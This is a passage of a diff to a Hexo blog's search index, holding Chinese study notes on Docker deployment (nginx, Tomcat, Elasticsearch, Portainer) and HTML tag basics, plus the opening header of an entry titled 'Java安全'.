@@ -1,6 +1,31 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Docker相关部署</title>
+    <url>/2023/07/31/Docker2/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
+
+<h1 id="Docker安装Nginx"><a href="#Docker安装Nginx" class="headerlink" title="Docker安装Nginx"></a>Docker安装Nginx</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.搜索镜像 docker search nginx</span><br><span class="line">2.下载镜像 docker pull nginx</span><br><span class="line">3.运行测试</span><br><span class="line">[root@163 ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">centos        latest    5d0da3dc9764   22 months ago   231MB</span><br><span class="line">-d 后台运行（停止了容器后，容器还可以查到）</span><br><span class="line">--name 给容器命名</span><br><span class="line">-p 宿主机:容器内部端口</span><br><span class="line">[root@163 ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">bb07f6e55670b129a14434aae3a9422cf3f7091f2d3079a5f96005613a909993</span><br><span class="line">[root@163 ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">bb07f6e55670   nginx     &quot;/docker-entrypoint.…&quot;   9 seconds ago   Up 8 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@163 ~]# curl localhost:3344</span><br><span class="line"></span><br><span class="line">4.进入容器</span><br><span class="line">[root@163 ~]# docker exec -it nginx01 /bin/bash</span><br><span class="line">root@bb07f6e55670:/# whereis nginx</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@bb07f6e55670:/# cd /etc/nginx</span><br><span class="line">root@bb07f6e55670:/etc/nginx# ls</span><br><span class="line">conf.d		mime.types  nginx.conf	 uwsgi_params</span><br><span class="line">fastcgi_params	modules     scgi_params</span><br><span class="line">root@bb07f6e55670:/etc/nginx# </span><br></pre></td></tr></table></figure>
+
+<h1 id="Docker安装Tomcat"><a href="#Docker安装Tomcat" class="headerlink" title="Docker安装Tomcat"></a>Docker安装Tomcat</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#官方使用</span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line">docker run -it --rm一般用于测试，用完立即删除</span><br><span class="line"></span><br><span class="line">#下载再使用</span><br><span class="line">docker pull tomcat:9.0</span><br><span class="line"></span><br><span class="line">#启动运行</span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">#测试访问没有问题</span><br><span class="line"></span><br><span class="line">#进入容器</span><br><span class="line">[root@163 ~]# docker exec -it tomcat01 /bin/bash</span><br><span class="line">#发现问题，1.1inux命今少了，2.没有webapps 阿里云镜像的原因。默认是最小的镜像，所有不必要的都被剔除掉。保证最小可运行的环境</span><br></pre></td></tr></table></figure>
+
+<h1 id="部署es-kibana"><a href="#部署es-kibana" class="headerlink" title="部署es+kibana"></a>部署es+kibana</h1><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">--net somenetwork  网络配置</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动</span></span><br><span class="line">docker run -d --name elasticsearch (--net somenetwork) -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:8.8.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动了 1inux就卡住了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 暴露的端口很多!</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 十分的耗内存</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 的数据一般霉要放置到安全目录!挂载</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker stats 查看 cpu的状态</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试一下es构建是否成功</span></span><br><span class="line">    curl localhost:9200</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">马上关闭，增加内存限制 修改配置文件 -e 环境配置修改</span></span><br><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:8.8.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装php和php插件"><a href="#安装php和php插件" class="headerlink" title="安装php和php插件"></a>安装php和php插件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php -y</span><br><span class="line">apt-get install libapache2-mod-php -y  --fix-missing</span><br><span class="line">apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>
+
+<h1 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h1><p><strong>什么 portainer ?</strong><br>Docker图形化界面管理工具!提供一个后台面板供我们操作 !</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure>
+
+<p>访问测试：端口打开8088  访问<a href="http://ip:8088/">http://ip:8088/</a></p>
+<h1 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命今和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息”-a=&quot;作者”容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br><span class="line">实战测试</span><br><span class="line"># 1、启动一个默认的tomcat</span><br><span class="line"># 2、发现这个默认的tomcat 是没有webapps应用，镜像的原因，官方的镜像默认 webapps下面是没有文件的!</span><br><span class="line"># 3、我自己拷贝进去了基本的文件</span><br><span class="line"># 4、将我们操作过的容器通过commit提交为一个境像! 我们以后就使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Basics</title>
     <url>/2023/07/26/Basics/</url>
     <content><![CDATA[<h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><span id="more"></span>
@@ -371,6 +396,84 @@
       </tags>
   </entry>
   <entry>
+    <title>HTML</title>
+    <url>/2023/08/08/HTML/</url>
+    <content><![CDATA[<h1 id="html基本元素标签"><a href="#html基本元素标签" class="headerlink" title="html基本元素标签"></a>html基本元素标签</h1><span id="more"></span>
+
+<ol>
+<li><p><code>&lt;html&gt;</code>：HTML网页的根标签，表示一个HTML文档的开始和结束</p>
+</li>
+<li><p><code>&lt;head&gt;</code>：HTML文档的头部，用于描述文档的元数据、样式等信息</p>
+</li>
+<li><p><code>&lt;title&gt;</code>：HTML文档的标题标签，用于在浏览器标签栏中显示文档的标题</p>
+</li>
+<li><p><code>&lt;body&gt;</code>：HTML文档的主体部分，包含了网页的实际内容</p>
+</li>
+<li><p><code>&lt;h1&gt;</code>～<code>&lt;h6&gt;</code>：标题标签，表示文本的标题，从大到小分别对应不同级别的标题</p>
+</li>
+<li><p><code>&lt;p&gt;</code>：段落标签，用于分隔文本内容</p>
+</li>
+<li><p><code>&lt;a&gt;</code>：超链接标签，用于添加链接到其他文档、页面、图片等</p>
+</li>
+<li><p><code>&lt;img&gt;</code>：图片标签，用于在网页中嵌入图片</p>
+</li>
+<li><p><code>&lt;ul&gt;</code>：无序列表标签，用于创建无序列表</p>
+</li>
+<li><p><code>&lt;ol&gt;</code>：有序列表标签，用于创建有序列表</p>
+</li>
+<li><p><code>&lt;li&gt;</code>：列表项标签，用于创建列表项</p>
+</li>
+<li><p><code>&lt;table&gt;</code>：表格标签，用于创建表格</p>
+</li>
+<li><p><code>&lt;tr&gt;</code>：表格的行标签，表示一行</p>
+</li>
+<li><p><code>&lt;td&gt;</code>：单元格标签，用于表示表格中的单元格</p>
+</li>
+<li><p><code>&lt;form&gt;</code>：表单标签，用于创建表单</p>
+</li>
+<li><p><code>&lt;input&gt;</code>：输入框标签，用于输入文本、表单等</p>
+</li>
+<li><p><code>&lt;select&gt;</code>：下拉列表标签，用于创建下拉选择框</p>
+</li>
+<li><p><code>&lt;textarea&gt;</code>：文本域标签，允许用户输入多行文本</p>
+</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档声明，声明当前网页的版本--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--html的根标签（元素），网页中的所有内容都要写在根元素的里边--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--head是网页头部，head中的内容不会在网页中直接出现，主要用来帮助浏览器或搜索引擎来解析网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--meta标签用来设置网页的元数据，这里meta用来设置网页的字符集，避免乱码问题--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--UTF-8（万国码）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>显示在浏览器的标题栏<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--body是html的子元素，表示网页的主体，网页中的所有可见的内容都应写在body里面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      这里是主体</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="格式化标签"><a href="#格式化标签" class="headerlink" title="格式化标签"></a>格式化标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br/&gt;         换行</span><br><span class="line"></span><br><span class="line">&lt;center&gt; &lt;/center&gt; 居中</span><br><span class="line"></span><br><span class="line">&lt;span&gt;&lt;/span&gt; 行标签(没有换行) </span><br><span class="line">&lt;kbd&gt;&lt;/kbd&gt;   定义键盘码    </span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;/p&gt;       行标签(自带换行)</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;   块标签不解析内容</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;/code&gt; 行标签不解析内容   </span><br><span class="line">&lt;var&gt;&lt;/var&gt;   定义变量</span><br><span class="line">&lt;em&gt;帅&lt;/em&gt;</span><br><span class="line">&lt;strong&gt;帅&lt;/strong&gt;</span><br><span class="line">em和strong标签都表示强调，但是它们还是有一定的差别的</span><br><span class="line">第一em标签的样式是斜体，而strong标签的样式是加粗</span><br><span class="line">第二em标签是强调语义的，而strong标签是强调内容的</span><br><span class="line">em标签和strong标签都是行内元素。</span><br></pre></td></tr></table></figure>
+<h3 id="样式标签"><a href="#样式标签" class="headerlink" title="样式标签"></a>样式标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;加粗&lt;/b&gt;</span><br><span class="line">&lt;i&gt;倾斜&lt;/i&gt;</span><br><span class="line">&lt;s&gt;删除线&lt;/s&gt; 或 &lt;del&gt;19999&lt;/del&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br><span class="line">&lt;font size=2&gt;字体大小&lt;/font&gt;</span><br><span class="line">&lt;font color=&quot;#fa8072&quot;&gt;字体颜色&lt;/font&gt;  </span><br><span class="line">&lt;hr&gt; 水平线 </span><br><span class="line">&lt;blockquote&gt;孔子说的不对&lt;/blockquote&gt;</span><br><span class="line">&lt;q&gt;老子才不对&lt;/q&gt;&lt;br&gt;</span><br><span class="line">q标签和blockquote标签都是引用，不同的是q标签是短引，用而blockquote标签是长引用会换行的。</span><br></pre></td></tr></table></figure>
+<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;      &amp;lt; </span><br><span class="line">&gt;      &amp;gt; </span><br><span class="line">空格   &amp;nbsp; </span><br><span class="line">©     &amp;copy; </span><br><span class="line">®     &amp;reg; </span><br><span class="line">™     &amp;trade;</span><br></pre></td></tr></table></figure>
+
+<h3 id="列表标签和表格标签"><a href="#列表标签和表格标签" class="headerlink" title="列表标签和表格标签"></a>列表标签和表格标签</h3><p>列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无序列表</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序列表</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自定义列表 没有圆点和需要</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;标题&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;..</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>
+
+<p>表格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">cellspacing属性是单元格之间的空隙</span><br><span class="line">cellpadding属性是控制整个单元格的大小</span><br><span class="line">border  是边框粗细</span><br><span class="line">align=&quot;center&quot; 居中   left左  right右</span><br><span class="line">style=&quot;text-align: center&quot; 字体居中</span><br><span class="line">其他的就需要使用css来控制了</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   cellspacing=&quot;0&quot; style=&quot;text-align: center&quot;  border=&quot;1px&quot;   &gt;</span><br><span class="line">    &lt;tr &gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题2&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用的布局标签"><a href="#常用的布局标签" class="headerlink" title="常用的布局标签"></a>常用的布局标签</h3><p>header   网页的头部</p>
+<p>main     网页的主体部分（一般只有一个）</p>
+<p>footer   网页的底部</p>
+<p>nav      网页的导航</p>
+<p>aside    和主题相关的内容</p>
+<p>article  文章之类的</p>
+<p>section  独立的块区，上面的标签都不合适，就用这个</p>
+<p>div      块元素</p>
+<h3 id="常用的图片标签"><a href="#常用的图片标签" class="headerlink" title="常用的图片标签"></a>常用的图片标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;图片地址&quot; alt=&quot;图片不显示时候的提示语句&quot; title=&quot;鼠标悬停提示文字&quot; </span><br><span class="line">width=&quot;图片宽px&quot; height=&quot;图片高px&quot;/&gt;</span><br><span class="line">如果宽高不写就默认原图片大小</span><br><span class="line"></span><br><span class="line">img 的其他属性:   </span><br><span class="line"></span><br><span class="line">hspace 和 vspace 属性可以设置图像周围的空间。   类似于设置外边距效果</span><br><span class="line">hspace:左边和右边的文字与图像之间的间距  单位像素(px)</span><br><span class="line">vspace:上面的下面的文字与图像之间的距离  单位像素(px)</span><br><span class="line"></span><br><span class="line">align 属性定义了图像相对于周围元素的水平和垂直对齐方式。</span><br><span class="line">align的值:left(左)、right(右)、top(上) 、middle(中) 和 bottom(下)。</span><br><span class="line">left 和 right 值会把图像周围与其相连的文本转移到相应的边界中；</span><br><span class="line">其余的三个值将图像与其相邻的文字在垂直方向上对齐</span><br></pre></td></tr></table></figure>
+
+<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls提供播放暂停音量控制  必须有</span><br><span class="line">autoplay 自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">preload  视频在页面加载时进行加载，并预备播放。</span><br><span class="line">	如果使用 &quot;autoplay&quot;，则忽略属性。属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">    </span><br><span class="line">(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">loop   媒介文件完成播放后再次开始播放     重复播放</span><br><span class="line">width=”宽度”  height=”高度”</span><br><span class="line">muted   视频的音频应该被静音</span><br><span class="line"></span><br><span class="line">&lt;video width=&quot;320&quot; height=&quot;240&quot; controls &gt;</span><br><span class="line">    &lt;source src=&quot;img/1.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">    您的浏览器不支持 video 属性。</span><br><span class="line">&lt;/video&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  视频类型</span><br></pre></td></tr></table></figure>
+
+<h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls   向用户显示控件，比如播放按钮。</span><br><span class="line">autoplay   自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">loop     每当音频结束时重新开始播放   </span><br><span class="line">preload  音频在页面加载时进行加载，并预备播放。如果使用 &quot;autoplay&quot;，则忽略该属性。  属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">	(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">&lt;audio controls  autoplay loop&gt;</span><br><span class="line">    &lt;source src=&quot;img/无羁.mp3&quot; type=&quot;audio/mp3&quot; &gt;</span><br><span class="line">    游览器不支持此播放器</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  音频类型</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>语言</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker命令</title>
     <url>/2023/07/31/Docker%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><span id="more"></span>
@@ -610,31 +713,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Docker相关部署</title>
-    <url>/2023/07/31/Docker2/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
-
-<h1 id="Docker安装Nginx"><a href="#Docker安装Nginx" class="headerlink" title="Docker安装Nginx"></a>Docker安装Nginx</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.搜索镜像 docker search nginx</span><br><span class="line">2.下载镜像 docker pull nginx</span><br><span class="line">3.运行测试</span><br><span class="line">[root@163 ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">centos        latest    5d0da3dc9764   22 months ago   231MB</span><br><span class="line">-d 后台运行（停止了容器后，容器还可以查到）</span><br><span class="line">--name 给容器命名</span><br><span class="line">-p 宿主机:容器内部端口</span><br><span class="line">[root@163 ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">bb07f6e55670b129a14434aae3a9422cf3f7091f2d3079a5f96005613a909993</span><br><span class="line">[root@163 ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">bb07f6e55670   nginx     &quot;/docker-entrypoint.…&quot;   9 seconds ago   Up 8 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@163 ~]# curl localhost:3344</span><br><span class="line"></span><br><span class="line">4.进入容器</span><br><span class="line">[root@163 ~]# docker exec -it nginx01 /bin/bash</span><br><span class="line">root@bb07f6e55670:/# whereis nginx</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@bb07f6e55670:/# cd /etc/nginx</span><br><span class="line">root@bb07f6e55670:/etc/nginx# ls</span><br><span class="line">conf.d		mime.types  nginx.conf	 uwsgi_params</span><br><span class="line">fastcgi_params	modules     scgi_params</span><br><span class="line">root@bb07f6e55670:/etc/nginx# </span><br></pre></td></tr></table></figure>
-
-<h1 id="Docker安装Tomcat"><a href="#Docker安装Tomcat" class="headerlink" title="Docker安装Tomcat"></a>Docker安装Tomcat</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#官方使用</span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line">docker run -it --rm一般用于测试，用完立即删除</span><br><span class="line"></span><br><span class="line">#下载再使用</span><br><span class="line">docker pull tomcat:9.0</span><br><span class="line"></span><br><span class="line">#启动运行</span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">#测试访问没有问题</span><br><span class="line"></span><br><span class="line">#进入容器</span><br><span class="line">[root@163 ~]# docker exec -it tomcat01 /bin/bash</span><br><span class="line">#发现问题，1.1inux命今少了，2.没有webapps 阿里云镜像的原因。默认是最小的镜像，所有不必要的都被剔除掉。保证最小可运行的环境</span><br></pre></td></tr></table></figure>
-
-<h1 id="部署es-kibana"><a href="#部署es-kibana" class="headerlink" title="部署es+kibana"></a>部署es+kibana</h1><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">--net somenetwork  网络配置</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动</span></span><br><span class="line">docker run -d --name elasticsearch (--net somenetwork) -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:8.8.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动了 1inux就卡住了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 暴露的端口很多!</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 十分的耗内存</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 的数据一般霉要放置到安全目录!挂载</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker stats 查看 cpu的状态</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试一下es构建是否成功</span></span><br><span class="line">    curl localhost:9200</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">马上关闭，增加内存限制 修改配置文件 -e 环境配置修改</span></span><br><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:8.8.1</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装php和php插件"><a href="#安装php和php插件" class="headerlink" title="安装php和php插件"></a>安装php和php插件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php -y</span><br><span class="line">apt-get install libapache2-mod-php -y  --fix-missing</span><br><span class="line">apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>
-
-<h1 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h1><p><strong>什么 portainer ?</strong><br>Docker图形化界面管理工具!提供一个后台面板供我们操作 !</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure>
-
-<p>访问测试：端口打开8088  访问<a href="http://ip:8088/">http://ip:8088/</a></p>
-<h1 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命今和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息”-a=&quot;作者”容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br><span class="line">实战测试</span><br><span class="line"># 1、启动一个默认的tomcat</span><br><span class="line"># 2、发现这个默认的tomcat 是没有webapps应用，镜像的原因，官方的镜像默认 webapps下面是没有文件的!</span><br><span class="line"># 3、我自己拷贝进去了基本的文件</span><br><span class="line"># 4、将我们操作过的容器通过commit提交为一个境像! 我们以后就使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java简介</title>
     <url>/2023/07/26/Java1/</url>
     <content><![CDATA[<h2 id="什么是Java"><a href="#什么是Java" class="headerlink" title="什么是Java"></a>什么是Java</h2><span id="more"></span>
@@ -677,220 +755,240 @@
       </tags>
   </entry>
   <entry>
-    <title>Java面向对象</title>
-    <url>/2023/07/27/Java3/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
+    <title>Java安全</title>
+    <url>/2023/08/15/Java%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h1 id="Java安全"><a href="#Java安全" class="headerlink" title="Java安全"></a>Java安全</h1><span id="more"></span>
 
-<h1 id="Java-对象和类"><a href="#Java-对象和类" class="headerlink" title="Java 对象和类"></a>Java 对象和类</h1><ul>
-<li><p><strong>类和对象的关系</strong><br><strong>类</strong>:类是对现实生活中一类具有共同属性和行为的事物的抽象<br><strong>对象</strong>:是能够看得到摸的着的真实存在的实体</p>
-</li>
-<li><p><strong>类的定义</strong><br><strong>类的重要性</strong>:是Java程序的基本组成单位<br><strong>类是什么</strong>:是对现实生活中一类具有共同属性和行为的事物的抽象，确定对象将会拥有的属性和行为</p>
-<p><strong>类的特点</strong>：类是对象的数据类型，是具有相同属性和行为的事物的抽象</p>
-<p><strong>类的组成</strong>:属性和行为<br><strong>属性</strong>:在类中通过成员变量来体现(类中方法外的变量)<br><strong>行为</strong>:在类中通过成员方法来体现(和前面的方法相比去掉static关键字即可)</p>
-</li>
-<li><p><strong>对象的定义</strong></p>
-<p>看看周围真实的世界，会发现身边有很多对象，车，手机，人等等。所有这些对象都有自己的属性和行为。</p>
-</li>
-</ul>
-<p>​       拿一个手机来举例，它的属性有：品牌、价格，行为有：打电话、发短信。</p>
-<p>​       软件对象也有属性和行为。行为通过方法体现。</p>
-<p>​       在软件开发中，方法操作对象内部状态的改变，对象的相互调用也是通过方法来完成。</p>
-<h2 id="Java-中的类"><a href="#Java-中的类" class="headerlink" title="Java 中的类"></a>Java 中的类</h2><p>类可以看成是创建 Java 对象的模板。</p>
-<p>pubIic class Phone {</p>
-<p>​		&#x2F;&#x2F;成员变量</p>
-<p>​		String brand;</p>
-<p>​		int price;</p>
-<p>​		&#x2F;&#x2F;成员方法</p>
-<p>​		public void call(){</p>
-<p>​			System.out.printIn(“打电话”);}<br>​		public void sendMessage(){</p>
-<p>​			System.out,pnintIn(“发短信”);}</p>
-<p>}</p>
-<p><strong>成员变量和局部变量的区别</strong></p>
-<table>
-<thead>
-<tr>
-<th align="center">区别</th>
-<th align="center">成员变量</th>
-<th align="center">局部变量</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">类中位置不同</td>
-<td align="center">类中方法外</td>
-<td align="center">方法内或者方法声明上</td>
-</tr>
-<tr>
-<td align="center">内存中位置不同</td>
-<td align="center">堆内存</td>
-<td align="center">栈内存</td>
-</tr>
-<tr>
-<td align="center">生命周期不同</td>
-<td align="center">随着对象的存在而存在，随看对象的消失而消失</td>
-<td align="center">随着方法的调用而存在，随着方法的调用完毕而消失</td>
-</tr>
-<tr>
-<td align="center">初始化值不同</td>
-<td align="center">有默认的初始化值</td>
